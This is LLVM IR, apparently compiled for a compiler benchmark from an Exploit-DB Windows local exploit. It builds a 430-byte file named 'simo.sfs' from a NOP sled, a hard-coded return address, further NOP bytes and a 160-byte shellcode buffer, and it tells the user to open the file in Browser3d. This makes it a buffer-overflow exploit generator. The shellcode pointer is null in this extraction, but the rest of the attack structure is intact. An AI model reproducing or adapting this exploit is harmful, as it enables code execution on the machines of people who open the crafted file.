; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_7843.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_7843.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [32 x i8] c"\09 ===>viva marrakesh city<===\09\0A\00", align 1
@__const.main.ret = private unnamed_addr constant [6 x i8] c"h\D5\85\07C\00", align 1
@__const.main.nop = private unnamed_addr constant [5 x i8] c"\90\90\90\90\00", align 1
@scode = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [9 x i8] c"simo.sfs\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"can't opening this file\0A\00", align 1
@.str.4 = private unnamed_addr constant [41 x i8] c"file created ....!open it whit Browser3d\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca [430 x i8], align 16
  %8 = alloca [262 x i8], align 16
  %9 = alloca [6 x i8], align 1
  %10 = alloca [5 x i8], align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  %12 = bitcast [6 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %12, i8* align 1 getelementptr inbounds ([6 x i8], [6 x i8]* @__const.main.ret, i32 0, i32 0), i64 6, i1 false)
  %13 = bitcast [5 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %13, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.nop, i32 0, i32 0), i64 5, i1 false)
  %14 = getelementptr inbounds [262 x i8], [262 x i8]* %8, i64 0, i64 0
  %15 = call i32 @memset(i8* %14, i32 144, i32 262)
  %16 = getelementptr inbounds [430 x i8], [430 x i8]* %7, i64 0, i64 0
  %17 = getelementptr inbounds [262 x i8], [262 x i8]* %8, i64 0, i64 0
  %18 = getelementptr inbounds [262 x i8], [262 x i8]* %8, i64 0, i64 0
  %19 = call i32 @strlen(i8* %18)
  %20 = call i32 @memcpy(i8* %16, i8* %17, i32 %19)
  %21 = getelementptr inbounds [430 x i8], [430 x i8]* %7, i64 0, i64 0
  %22 = getelementptr inbounds [262 x i8], [262 x i8]* %8, i64 0, i64 0
  %23 = call i32 @strlen(i8* %22)
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %21, i64 %24
  %26 = getelementptr inbounds [6 x i8], [6 x i8]* %9, i64 0, i64 0
  %27 = getelementptr inbounds [6 x i8], [6 x i8]* %9, i64 0, i64 0
  %28 = call i32 @strlen(i8* %27)
  %29 = call i32 @memcpy(i8* %25, i8* %26, i32 %28)
  %30 = getelementptr inbounds [430 x i8], [430 x i8]* %7, i64 0, i64 0
  %31 = getelementptr inbounds [262 x i8], [262 x i8]* %8, i64 0, i64 0
  %32 = call i32 @strlen(i8* %31)
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %30, i64 %33
  %35 = getelementptr inbounds [6 x i8], [6 x i8]* %9, i64 0, i64 0
  %36 = call i32 @strlen(i8* %35)
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %34, i64 %37
  %39 = getelementptr inbounds [5 x i8], [5 x i8]* %10, i64 0, i64 0
  %40 = getelementptr inbounds [5 x i8], [5 x i8]* %10, i64 0, i64 0
  %41 = call i32 @strlen(i8* %40)
  %42 = call i32 @memcpy(i8* %38, i8* %39, i32 %41)
  %43 = getelementptr inbounds [430 x i8], [430 x i8]* %7, i64 0, i64 0
  %44 = getelementptr inbounds [262 x i8], [262 x i8]* %8, i64 0, i64 0
  %45 = call i32 @strlen(i8* %44)
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %43, i64 %46
  %48 = getelementptr inbounds [6 x i8], [6 x i8]* %9, i64 0, i64 0
  %49 = call i32 @strlen(i8* %48)
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %47, i64 %50
  %52 = getelementptr inbounds [5 x i8], [5 x i8]* %10, i64 0, i64 0
  %53 = call i32 @strlen(i8* %52)
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %51, i64 %54
  %56 = load i8*, i8** @scode, align 8
  %57 = call i32 @memcpy(i8* %55, i8* %56, i32 160)
  %58 = call i32* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  store i32* %58, i32** %6, align 8
  %59 = load i32*, i32** %6, align 8
  %60 = icmp eq i32* %59, null
  br i1 %60, label %61, label %63

61:                                               ; preds = %2
  %62 = call i32 @perror(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0))
  br label %63

63:                                               ; preds = %61, %2
  %64 = getelementptr inbounds [430 x i8], [430 x i8]* %7, i64 0, i64 0
  %65 = load i32*, i32** %6, align 8
  %66 = call i32 @fwrite(i8* %64, i32 1, i32 430, i32* %65)
  %67 = load i32*, i32** %6, align 8
  %68 = call i32 @fclose(i32* %67)
  %69 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
